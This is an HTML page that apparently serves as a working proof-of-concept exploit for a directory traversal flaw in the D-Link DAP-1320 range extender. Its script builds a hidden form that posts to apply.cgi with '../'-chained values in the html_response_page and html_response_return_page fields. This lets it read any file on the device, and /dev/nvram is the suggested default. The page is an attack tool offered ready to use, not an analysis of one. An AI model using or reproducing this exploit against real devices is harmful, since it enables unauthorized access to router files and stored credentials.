<html>
<head>
<script>
	window.onload=function(){
		var path=(new URL(window.location.href).searchParams.get("path"));
		if(path!=null){
			document.getElementById("newLink").value=path;
			dap1320_dirtraversal();
		}
	}

	function dap1320_dirtraversal() {
		ip =  "dlinkap.local";
		path = document.getElementById("newLink").value;
		document.title=path;
		var form = '<input type="hidden"	name="submit_type" value="nas_admin"/>\
		<input	type="hidden"	name="html_response_page"	value="/../../../../../../../../../../../../../../../../../' + encodeURI(path) + '"/>\
		<input	type="hidden"	name="html_response_return_page"	value="/../../../../../../../../../../../../../../../../../' + encodeURI(path) + '"/>\
		<input	type="hidden"	name="action"	value="reset_ifconfig_packet_counter"/>\
		</form>';
		
		post('http://' + ip + '/apply.cgi', form);
	}
	function post(url, fields) {
		var p = document.createElement('form');
		p.action = url;
		p.innerHTML = fields;
		p.target = document.getElementById("newtab").checked ? "_blank" : 'Iframe';
		p.method = 'post';
		document.body.appendChild(p);
		p.submit();
	}
</script>
</head>
<body>
	<form action="Javascript:dap1320_dirtraversal()">
		PATH: <input type="text" id="newLink" placeholder="/dev/nvram">
		<input type="submit" value="Go">
		<input type="checkbox" id="newtab">Open in new tab
	</form>
	<iframe name="Iframe" id="Iframe" src="" style="width:100%; height:94%;"></iframe>
</body>
</html>